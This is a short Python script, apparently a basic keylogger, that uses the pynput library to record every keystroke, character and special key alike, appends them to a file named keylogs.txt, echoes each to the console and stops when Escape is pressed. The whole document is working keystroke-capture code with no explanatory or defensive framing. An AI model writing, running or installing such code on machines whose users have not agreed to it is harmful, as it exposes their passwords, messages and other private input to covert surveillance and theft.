import os
from pynput import keyboard

def on_press(key):
    try:
        with open('keylogs.txt', 'a') as f:
            if hasattr(key, 'char'):
                print(f"Key pressed: {key.char}")
                f.write(key.char)
            else:
                print(f"Special key pressed: {str(key)}")
                f.write(str(key))
    except AttributeError:
        pass

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()